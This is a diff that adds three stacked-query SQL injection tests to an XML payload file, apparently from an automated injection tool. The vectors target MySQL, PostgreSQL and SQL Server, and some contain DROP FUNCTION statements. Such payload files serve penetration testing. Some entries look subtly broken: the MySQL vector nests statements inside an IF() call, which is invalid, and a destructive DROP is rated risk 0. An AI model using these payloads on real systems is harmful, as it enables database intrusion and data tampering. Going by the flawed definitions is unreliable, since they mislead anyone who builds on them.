@@ -1558,6 +1558,67 @@ Formats:
     <!-- End of stacked queries tests -->
 
 
+    <!-- Forced-error blind stacked queries tests -->
+    <test>
+        <title>MySQL forced-error blind stacked queries</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>; IF(([INFERENCE]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</vector>
+        <request>
+            <payload>; IF(([RANDNUM]=[RANDNUM]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>; IF(([RANDNUM]=[RANDNUM1]), SELECT [RANDNUM], DROP FUNCTION [RANDSTR]);</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL forced-error blind stacked queries</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>2</where>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/0 END);</vector>
+        <request>
+            <payload>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END);</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/0 END);</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase forced-error blind stacked queries</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>; IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</vector>
+        <request>
+            <payload>; IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>; IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+    <!-- End of forced-error blind stacked queries tests -->
+
+
     <!-- AND time-based blind tests -->
     <test>
         <title>MySQL &gt; 5.0.11 AND time-based blind</title>
